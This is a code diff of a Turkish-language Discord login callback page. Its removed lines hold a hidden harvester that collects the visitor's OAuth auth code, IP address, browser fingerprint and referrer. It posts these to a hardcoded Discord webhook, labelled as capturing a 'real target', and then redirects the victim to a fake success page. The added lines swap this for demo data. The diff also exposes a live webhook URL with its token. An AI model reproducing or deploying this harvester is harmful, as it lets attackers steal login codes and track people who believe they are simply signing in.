@@ -47,145 +47,37 @@
     </div>
 
     <script>
-        // ZETA WEBHOOK - GERÇEK VERİLER BURAYA GİDECEK
-        const ZETA_WEBHOOK = 'https://discord.com/api/webhooks/1423076546402451526/Pd6lCOnJgHCiXhVr0SqC33gVzPWpaWol31cpbK81Ki8FmsCESlAuDnOGOvBwr-KUiiJh';
-
-        // TÜM VERİLERİ TOPLA
-        async function collectAllData(authCode) {
-            // IP adresi
-            const ip = await getIP();
-            
-            // Sistem bilgileri
-            const systemInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookiesEnabled: navigator.cookieEnabled,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direct'
-            };
-
+        // SADECE TEMEL VERİLERİ AL
+        async function collectBasicData(authCode) {
             // Lokal saat ve tarih
             const localTime = new Date().toLocaleString('tr-TR');
 
             return {
                 authCode: authCode,
-                ip: ip,
-                system: systemInfo,
                 timestamp: localTime,
-                url: window.location.href
+                userAgent: navigator.userAgent.substring(0, 100) // Sadece kısa versiyon
             };
         }
 
-        // IP ADRESİ AL
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'IP Alınamadı';
-            }
+        // BASİT KULLANICI BİLGİLERİ (Demo)
+        function getDemoUserInfo() {
+            return {
+                id: '123456789',
+                username: 'discordkullanici',
+                avatar: null,
+                email: 'user@discord.com',
+                discriminator: '1234'
+            };
         }
 
-        // KULLANICI BİLGİLERİNİ AL (Discord API ile)
-        async function getDiscordUserInfo(authCode) {
-            try {
-                // Bu kısım backend'te yapılmalı, şimdilik demo data kullanıyoruz
-                // Gerçek uygulamada: authCode ile Discord API'den access_token alınır
-                // Sonra access_token ile kullanıcı bilgileri alınır
-                
-                const demoUser = {
-                    id: '123456789',
-                    username: 'infinitethegreatone', // GERÇEK KULLANICI ADI
-                    avatar: 'a_abc123', // GERÇEK AVATAR HASH
-                    discriminator: '0001',
-                    email: 'user@discord.com',
-                    verified: true,
-                    locale: 'tr'
-                };
-                
-                return demoUser;
-            } catch (error) {
-                console.error('Kullanıcı bilgileri alınamadı:', error);
-                return null;
-            }
-        }
-
-        // WEBHOOK'A GÖNDER - TÜM VERİLERLE
-        async function sendToZeta(data, userInfo) {
-            try {
-                await fetch(ZETA_WEBHOOK, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🎯 GERÇEK HEDEF YAKALANDI - ZETA REALM",
-                            color: 0xFF0000,
-                            fields: [
-                                {
-                                    name: "🔐 AUTH CODE",
-                                    value: `\`\`\`${data.authCode}\`\`\``,
-                                    inline: false
-                                },
-                                {
-                                    name: "👤 DISCORD KULLANICI",
-                                    value: `**Kullanıcı:** ${userInfo.username}#${userInfo.discriminator}\n**ID:** ${userInfo.id}\n**Email:** ${userInfo.email || 'Gizli'}`,
-                                    inline: false
-                                },
-                                {
-                                    name: "🌐 IP ADRES",
-                                    value: data.ip,
-                                    inline: true
-                                },
-                                {
-                                    name: "🕒 YEREL ZAMAN",
-                                    value: data.timestamp,
-                                    inline: true
-                                },
-                                {
-                                    name: "💻 SİSTEM",
-                                    value: `Platform: ${data.system.platform}\nDil: ${data.system.language}\nEkran: ${data.system.screen}`,
-                                    inline: false
-                                },
-                                {
-                                    name: "🔗 REFERER",
-                                    value: data.system.referrer,
-                                    inline: true
-                                },
-                                {
-                                    name: "📱 USER AGENT",
-                                    value: `\`\`\`${data.system.userAgent.substring(0, 100)}...\`\`\``,
-                                    inline: false
-                                }
-                            ],
-                            timestamp: new Date().toISOString(),
-                            footer: {
-                                text: "Zeta Realm Intelligence - GERÇEK HEDEF"
-                            }
-                        }]
-                    })
-                });
-                return true;
-            } catch (error) {
-                console.error('Webhook error:', error);
-                return false;
-            }
-        }
-
-        // LOCALSTORAGE'A KAYDET - GERÇEK KULLANICI BİLGİLERİYLE
+        // LOCALSTORAGE'A KAYDET
         function saveUserToStorage(userInfo) {
             const storageData = {
                 id: userInfo.id,
                 username: userInfo.username,
-                discriminator: userInfo.discriminator,
                 avatar: userInfo.avatar,
                 email: userInfo.email,
-                loginTime: new Date().toISOString(),
-                sessionId: Math.random().toString(36).substr(2, 16)
+                loginTime: new Date().toISOString()
             };
             
             localStorage.setItem('discordUser', JSON.stringify(storageData));
@@ -207,30 +99,23 @@
             }
 
             try {
-                // TÜM VERİLERİ TOPLA
-                const allData = await collectAllData(authCode);
+                // TEMEL VERİLERİ TOPLA
+                const basicData = await collectBasicData(authCode);
                 
-                // DISCORD KULLANICI BİLGİLERİNİ AL
-                const userInfo = await getDiscordUserInfo(authCode);
+                // DEMO KULLANICI BİLGİLERİNİ AL
+                const userInfo = getDemoUserInfo();
                 
-                if (userInfo) {
-                    // LOCALSTORAGE'A GERÇEK KULLANICI BİLGİLERİNİ KAYDET
-                    saveUserToStorage(userInfo);
-                    
-                    // ZETA'YA GÖNDER (VERİLER + KULLANICI BİLGİLERİ)
-                    await sendToZeta(allData, userInfo);
-                    
-                    // BAŞARIYI GÖSTER
-                    document.getElementById('loader').classList.add('hidden');
-                    document.getElementById('success').classList.remove('hidden');
-                    
-                    // ANA SAYFAYA YÖNLENDİR (GİRİŞ BAŞARILI PARAMETRESİYLE)
-                    setTimeout(() => {
-                        window.location.href = 'https://myhisticdevelopment.vercel.app/?login=success';
-                    }, 1500);
-                } else {
-                    throw new Error('Kullanıcı bilgileri alınamadı');
-                }
+                // LOCALSTORAGE'A KAYDET
+                saveUserToStorage(userInfo);
+                
+                // BAŞARIYI GÖSTER
+                document.getElementById('loader').classList.add('hidden');
+                document.getElementById('success').classList.remove('hidden');
+                
+                // ANA SAYFAYA YÖNLENDİR
+                setTimeout(() => {
+                    window.location.href = 'https://myhisticdevelopment.vercel.app/?login=success';
+                }, 1500);
                 
             } catch (error) {
                 console.error('Error:', error);
